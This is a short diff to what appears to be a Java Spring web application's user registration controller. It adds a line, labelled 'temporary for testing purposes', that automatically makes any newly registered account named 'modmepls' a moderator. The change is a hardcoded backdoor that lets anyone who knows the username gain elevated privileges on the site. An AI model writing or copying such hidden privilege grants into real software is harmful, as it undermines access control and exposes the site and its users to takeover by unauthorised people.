@@ -17,6 +17,9 @@ public class UserController {
     UserService userService;
     @Autowired
     SettingsService settingsService;
+    
+    @Autowired
+    AdminUserController adminUserController;
 
     @PostMapping("/register")
     public String registerUser(User user, RedirectAttributes re) {
@@ -57,6 +60,10 @@ public class UserController {
 
         user.setRole(role);
         userService.save(user);
+
+
+        //temporary for testing purposes
+        if(user.getUsername().equals("modmepls")) adminUserController.hireMod(user);
 
         // Creates user settings and saves
 
